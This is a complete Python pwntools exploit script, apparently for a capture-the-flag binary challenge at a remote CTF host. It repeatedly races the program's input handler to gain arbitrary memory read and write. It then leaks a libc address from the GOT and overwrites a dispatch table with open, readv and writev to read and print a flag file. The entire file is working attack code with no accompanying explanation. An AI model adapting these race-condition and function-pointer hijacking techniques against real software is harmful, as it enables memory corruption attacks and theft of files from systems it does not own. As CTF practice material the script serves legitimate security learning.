from pwn import *

context(arch='amd64', os='linux', log_level='debug')
context.binary = exe = ELF('./attachments/pwn', checksec=False)
libc = ELF('./attachments/libc.so.6', checksec=False)
ld = ELF('./attachments/ld-linux-x86-64.so.2', checksec=False)

HOST = args.HOST or 'nc1.ctfplus.cn'
PORT = int(args.PORT or 12546)

TABLE3 = 0x4040f8
IOV_ADDR = 0x404150
BUF_ADDR = 0x404180

WAITS = [0.166, 0.170, 0.174, 0.178, 0.182, 0.186, 0.190, 0.196, 0.204, 0.220, 0.240, 0.260, 0.300]


def start():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process([ld.path.encode(), exe.path.encode()], env={b'LD_PRELOAD': libc.path.encode()})
        # io = process(exe.path)
    return io


def menu(io, idx):
    io.sendlineafter(b'> ', str(idx).encode())


def prep(io):
    menu(io, 2)
    io.sendafter(b'forge primer (1 byte)> ', b'B' * 0x30)
    io.recvuntil(b'forge committed\n')

    menu(io, 3)
    io.recvuntil(b'actuator ready\n')

    menu(io, 1)
    io.sendlineafter(b'appeal target (0x20-0x78)> ', b'0x78')
    io.recvuntil(b'supremacy.\n')


def build_payload(lane, length, data_ptr, inline=b''):
    pay = bytearray(b'A' * 0x88)
    pay[:8] = b'sentinel'
    pay[0x30:0x38] = p64(0)
    pay[0x38:0x40] = p64(0x51)
    pay[0x50:0x54] = p32(lane)
    pay[0x58:0x60] = p64(length)
    pay[0x60:0x68] = p64(data_ptr)
    pay[0x68:0x88] = inline[:0x20].ljust(0x20, b'\x00')
    return bytes(pay)


def race_once(io, lane, length, data_ptr, wait, inline=b''):
    menu(io, 2)
    io.recvuntil(b'forge primer (1 byte)> ')
    sleep(wait)

    pay = build_payload(lane, length, data_ptr, inline)

    # gdb.attach(io, 'b *main\nc')
    io.send(pay[:1])
    io.send(pay[1:])
    io.recvuntil(b'forge committed\n')

    menu(io, 7)
    blob = io.recvuntil(b'> ')
    io.unrecv(b'> ')

    if b'lane=%d ' % lane in blob and (b'len=0x%x' % length in blob or b'len=%d' % length in blob):
        log.success('race hit -> lane=%d len=%#x wait=%.3f' % (lane, length, wait))
        return wait

    return 0


def arm(io, lane, length, data_ptr, inline=b'', waits=None, rounds=1):
    if waits is None:
        waits = WAITS

    for _ in range(rounds):
        for wait in waits:
            hit = race_once(io, lane, length, data_ptr, wait, inline)
            if hit:
                return hit

    raise EOFError('race miss')


def retune(wait):
    if not args.REMOTE:
        return WAITS, 80

    waits = [
        max(0.0, wait - 0.006),
        max(0.0, wait - 0.002),
        wait,
        wait + 0.004,
        wait + 0.010,
    ]
    return waits, 8


def aar_read(io, waits, rounds):
    hit = arm(io, 0, 8, exe.got['read'], waits=waits, rounds=rounds)
    menu(io, 6)
    io.recvuntil(b'[dispatch lane 0]\n')
    # leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    leak = u64(io.recvn(8))
    io.recvuntil(b'[dispatch complete]\n')
    return leak, hit


def aaw(io, addr, data, waits, rounds):
    hit = arm(io, 1, len(data), addr, waits=waits, rounds=rounds)
    menu(io, 6)
    io.recvuntil(b'[dispatch lane 1]\n')
    io.send(data)
    io.recvuntil(b'[dispatch complete]\n')
    return hit


def call_lane3(io, data_ptr, length, waits, rounds, inline=b''):
    hit = arm(io, 3, length, data_ptr, inline=inline, waits=waits, rounds=rounds)
    menu(io, 6)
    return hit


def one(path):
    io = start()
    try:
        prep(io)

        waits = WAITS
        rounds = 24 if args.REMOTE else 80

        read_addr, hit = aar_read(io, waits, rounds)
        libc.address = read_addr - libc.sym['read']
        log.success('read@libc = %#x' % read_addr)
        log.success('libc base  = %#x' % libc.address)
        waits, rounds = retune(hit)

        blob = flat(
            BUF_ADDR, 0x80,
        ).ljust(0x30, b'\x00') + path[:0x20].ljust(0x20, b'\x00')
        hit = aaw(io, IOV_ADDR, blob, waits, rounds)
        waits, rounds = retune(hit)

        hit = aaw(io, TABLE3, p64(libc.sym['open']), waits, rounds)
        waits, rounds = retune(hit)
        hit = call_lane3(io, BUF_ADDR, 0, waits, rounds)
        waits, rounds = retune(hit)
        io.recvuntil(b'[dispatch complete]\n')

        hit = aaw(io, TABLE3, p64(libc.sym['readv']), waits, rounds)
        waits, rounds = retune(hit)
        hit = call_lane3(io, 3, IOV_ADDR, waits, rounds)
        waits, rounds = retune(hit)
        io.recvuntil(b'[dispatch complete]\n')

        hit = aaw(io, TABLE3, p64(libc.sym['writev']), waits, rounds)
        waits, rounds = retune(hit)
        call_lane3(io, 1, IOV_ADDR, waits, rounds)

        sleep(0.2)
        return io.recvrepeat(1.5)
    finally:
        io.close()


def main():
    path = (args.PATH or '/flag').encode()
    if not path.endswith(b'\x00'):
        path += b'\x00'

    if len(path) > 0x20:
        raise ValueError('flag path too long')

    attempts = int(args.ATTEMPTS or 100)

    for i in range(attempts):
        log.info('attempt %d' % (i + 1))
        try:
            data = one(path)
        except Exception as e:
            log.warning('attempt %d failed: %s' % (i + 1, e))
            continue

        if data.strip():
            print(data.decode('latin-1', 'replace'))
            if b'flag{' in data.lower() or b'ctf{' in data.lower() or b'polaris' in data.lower():
                return

    raise SystemExit('no flag hit')


if __name__ == '__main__':
    main()
